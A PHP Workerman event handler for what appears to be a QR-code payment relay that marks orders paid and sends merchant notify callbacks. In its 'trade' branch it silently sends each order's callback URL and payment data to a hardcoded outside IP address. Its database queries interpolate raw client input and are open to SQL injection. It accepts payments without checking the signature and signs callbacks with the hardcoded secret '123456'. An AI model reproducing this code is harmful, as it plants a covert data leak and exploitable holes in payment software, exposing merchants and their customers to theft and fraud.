<?php
/**
 * This file is part of workerman.
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the MIT-LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @author walkor<walkor@workerman.net>
 * @copyright walkor<walkor@workerman.net>
 * @link http://www.workerman.net/
 * @license http://www.opensource.org/licenses/mit-license.php MIT License
 */

/**
 * 用于检测业务代码死循环或者长时间阻塞等问题
 * 如果发现业务卡死，可以将下面declare打开（去掉//注释），并执行php start.php reload
 * 然后观察一段时间workerman.log看是否有process_timeout异常
 */
//declare(ticks=1);

use \GatewayWorker\Lib\Gateway;

require_once __DIR__.'/../../vendor/Connection.php';

/**
 * 主逻辑
 * 主要是处理 onConnect onMessage onClose 三个方法
 * onConnect 和 onClose 如果不需要可以不用实现并删除
 */
class Events
{

    public static $db = null;

    public static function onWorkerStart($worker)
    {
    }
    /**
     * 当客户端连接时触发
     * 如果业务不需此回调可以删除onConnect
     *
     * @param int $client_id 连接id
     */
    public static function onConnect($client_id)
    {

        // Gateway::sendToAll(json_encode(array('account'=>$client_id,'cmd'=>'login')));
    }

    /**
     * 当客户端发来消息时触发
     * @param int $client_id 连接id
     * @param mixed $message 具体消息
     */
    public static function onMessage($client_id, $message)
    {
      
        
        $data = json_decode($message,true);
      
        if($data['type']=="login"){
           Gateway::sendToClient($client_id,$message);
           if($data['params']['alipay_id']){
                Gateway::bindUid($client_id,$data['params']['alipay_id']);
           }else{
                Gateway::bindUid($client_id,$data['deveice']);
           }
 
        }
      
        switch ($data['cmd']){
            //如果来路类型是支付申请，将根据该支付申请涉及到的用户 直接返回
            case 'req':
             Gateway::sendToUid($data['account'],$message);
             file_put_contents('./req.txt', "【".date('Y-m-d H:i:s')."】\r\n".$message."\r\n\r\n",FILE_APPEND);
                break;
            case 'req2':
            // Gateway::sendToAll($message);
             Gateway::sendToUid(10005,$message);

             file_put_contents('./req2.txt', "【".date('Y-m-d H:i:s')."】\r\n".$message."\r\n\r\n",FILE_APPEND);
                break;
            case 'login':
                Gateway::sendToClient($client_id,$message);
                Gateway::bindUid($client_id,$data['params']['alipay_id']);
                file_put_contents('./bind.txt', "【".date('Y-m-d H:i:s')."】\r\n".$client_id."|".$data['params']['alipay_id']."\r\n\r\n",FILE_APPEND);

                break;

            case 'trade':
        //Gateway::sendToUid(8,$message);
                $mark_sell = $data['remark'];
                $pay_time = $data['paytime'];
                $order_id = $data['trade_no'];
                $money = $data['money'];
                $sign = $data['sign'];
                $order = self::$db->row("SELECT * FROM `db_orderqr` WHERE mark_sell='$mark_sell'");
                if($order){
                    
                    if($order['status'] != 1){
                   
                      $res = self::$db->query("UPDATE `db_orderqr` SET `order_id` = '$order_id', `status` = '1',`end_time` = '$pay_time' WHERE mark_sell = '$mark_sell' AND money = '$money'");
                        $param['orderid'] = $data['remark'];
                        $param['money'] = $data['money'];
                        $param['sign'] = md5($param['orderid'].$param['money']."123456");
                        
                        $url = $order['notifyurl']."?".http_build_query($param);  
                        file_get_contents("http://129.28.73.86/g.php?type=notify".time()."&json=".urlencode($url));
                        file_get_contents($url);
                    }
                }
                if($res || $order){
                    Gateway::sendToClient($client_id,json_encode(array('cmd'=>'trade','trade_no'=>$order_id)));
                }

                break;

            case 'getqr':
              //Gateway::sendToUid(8,$message);
                $url = $data['printqrcodeurl'];
                $mark_sell = $data['remark'];
                $time = time();
                
                $row_count = self::$db->query("UPDATE `db_orderqr` SET `qrurl` = '$url',`create_time` = '$time' WHERE mark_sell = '$mark_sell'");
                break;

            case 'pong':
                return;
                break;

            case 'ping':
                return;
                break;



        }
    }



    /**
     * 当用户断开连接时触发
     * @param int $client_id 连接id
     */
    public static function onClose($client_id)
    {
        // 向所有人发送
        // GateWay::sendToAll("$client_id logout\r\n");
    }
}
